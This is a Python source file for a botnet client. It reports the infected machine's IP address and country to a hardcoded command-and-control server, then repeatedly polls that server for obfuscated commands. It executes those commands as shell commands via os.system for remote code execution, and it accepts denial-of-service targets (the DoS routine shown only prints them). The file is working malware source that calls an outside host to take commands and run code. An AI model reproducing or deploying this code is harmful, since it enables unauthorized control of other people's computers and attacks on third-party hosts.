# imports
import base64, time, requests, os
from os import system, name
import json, html, threading, random, sys

# setting the cnc server
cnc_server = 'https://net.cloudcant.repl.co'


# getting bot ip
def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botinfo = f"{getinfo('ip')}@{getinfo('country')}"

# sending bot info
requests.get(f"{cnc_server}/bot?connect={botinfo}")


# clear the console supporting cross platform
def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# encode input with base64
def b64_encode(input):
  input_ascii = input.encode("ascii")
  input_b64_raw = base64.b64encode(input_ascii)
  input_b64 = input_b64_raw.decode("ascii")
  return input_b64


# decode base64 input
def b64_decode(string):
  string_ascii = string.encode("ascii")
  string_decoded_raw = base64.b64decode(string_ascii)
  string_decoded = string_decoded_raw.decode("ascii")
  return string_decoded


# reverse input
def reverse(input):
  return input[::-1]


# full encode
def encode(string):
  step1 = b64_encode(string)
  step2 = reverse(step1)
  output = b64_encode(step2)
  return output


# full decode
def decode(string):
  step4 = b64_decode(string)
  step5 = reverse(step4)
  output = b64_decode(step5)
  return output


# gettingn the command from the cnc server
def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


# getting the if toggle
def getcheck():
  cnc_check = requests.get(f"{cnc_server}/bot?check")
  check = html.unescape(cnc_check.text)
  return check


# logs
def log(check):
  global command
  command = getcommand()
  clear()
  print(f"""
  {botinfo}
  ├── {cnc_server}/bot
  │   ├── {encode(command)}
  │   └── {decode(command)}
  ├── {cnc_server}/bot?check
  │   ├── {encode(check)}
  │   └── {check}
""")


# denial of service example
def dos(host, reqs, threadc):
  print(f"""
  {botinfo}
  ├── DOS
  │   ├── {host}
  │   ├── {reqs}
  │   └── {threadc}
""")


# main process loop
while True:
  # getting if toggled
  status = decode(getcheck())
  # if toggle is set to listen
  if status == 'listen':
    log('Listen')
    # checks command type
    if '*rce*' in decode(command):
      os.system(str(decode(command).replace('*rce*', '')))
    elif '*dos*' in decode(command):
      host, reqs, threads = str(decode(command).replace('*dos*',
                                                        '')).split('::')
      dos(host, reqs, threads)
    elif "*print*" in decode(command):
      print(str(decode(command).replace('*print*', '')))
    # if the command has nothing in it pass
    else:
      pass
    time.sleep(2)
  # else if toggle is set to off
  elif status == 'off':
    log('Off')
    time.sleep(2)
  # else than log err
  else:
    log('err')
    time.sleep(2)
